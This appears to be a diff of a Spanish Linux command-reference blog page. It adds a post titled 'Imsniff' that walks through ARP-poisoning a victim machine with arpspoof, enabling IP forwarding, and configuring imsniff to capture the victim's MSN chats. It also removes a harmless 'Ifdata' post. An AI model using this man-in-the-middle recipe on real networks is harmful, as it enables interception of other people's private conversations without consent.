@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="Visualizar documentos PDF e imágenes (jpg, tiff, png&#8230;) $ impressive documento.pdf $ impressive -l (lista efectos disponibles) $ impressive -t &hellip;">
+  <meta name="description" content="Capturar paquetes relacionados con el protocolo MSN . Su uso pasa por el envenenamiento arp, situando nuestra máquina entre la victima y el router &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -74,6 +74,78 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/imsniff/">Imsniff</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Capturar paquetes relacionados con el protocolo MSN . Su uso pasa por el envenenamiento arp, situando nuestra máquina entre la victima y el router lanzando en varias terminales y sin cerrarlas:</p>
+
+<blockquote><p># arpspoof -i eth0 -t 192.168.1.15 192.168.1.1</p>
+
+<p># arpspoof -i eth0 -t 192.168.1.1 192.168.1.15</p></blockquote>
+
+<p>Activar forwarding para que los paquetes vayan a su verdadero dueño:</p>
+
+<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Crear una carpeta donde guardar los datos:</p>
+
+<blockquote><p>$ mkdir snifadas</p></blockquote>
+
+<p>Modificar el archivo de configuración a partir de la  propia documentación ::</p>
+
+<blockquote><p># cp /usr/share/doc/imsniff/examples/imsniff.conf.sample /etc/imsniff.conf</p>
+
+<p># nano /etc/imsniff.conf</p></blockquote>
+
+<p>daemonize = 0</p>
+
+<p>promisc = 0</p>
+
+<p>verbose = 2</p>
+
+<p>chatdir = /home/USER/snifadas/chats</p>
+
+<p>debugdir = /home/USER/snifadas/debug</p>
+
+<p>interface eth0</p>
+
+<p>Los directorios &#8220;chats&#8221; y &#8220;debug&#8221; los crea la misma aplicación.</p>
+
+<p>Lanzar el sniffer de conversaciones msn:</p>
+
+<blockquote><p># imsniff</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -511,56 +583,6 @@ IFS=$OLDIFS
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/ifdata/">Ifdata</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-04-05T18:19:00+02:00" pubdate data-updated="true">05-04-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>[moreutils]. Muestra información de la red.</p>
-
-<blockquote><p>$ ifdata -p eth0 (Muestra la ip local, la mascara de red, la dirección broadcast y los MTU de la red)</p>
-
-<p>$ ifdata -pa -pn eth0 (Muestra la ip local i la mascara de red)</p>
-
-<p>$ ifdata -pe eth5 (Muestra &#8220;yes&#8221; o &#8220;no&#8221; sobre si existe o no la red especificada)</p></blockquote>
-
-<p>Otras opciones:</p>
-
-<p>-pb (La dirección broadcast)</p>
-
-<p>-ph (Muestra la MAC)</p>
-
-<p>-pf (Muestra las caracteristicas de la red)</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/blog/page/87/">&larr; Older</a>
@@ -582,6 +604,14 @@ IFS=$OLDIFS
 <section>
   <h1>Añadidos/modificados</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/update-manager/">update-manager</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/do-release-upgrade/">do-release-upgrade</a>
+      </li>
     
       <li class="post">
         <a href="/blog/slackpkg/">slackpkg</a>
@@ -613,14 +643,6 @@ IFS=$OLDIFS
     
       <li class="post">
         <a href="/blog/sed/">sed</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/john/">john</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/find/">find</a>
       </li>
     
   </ul>
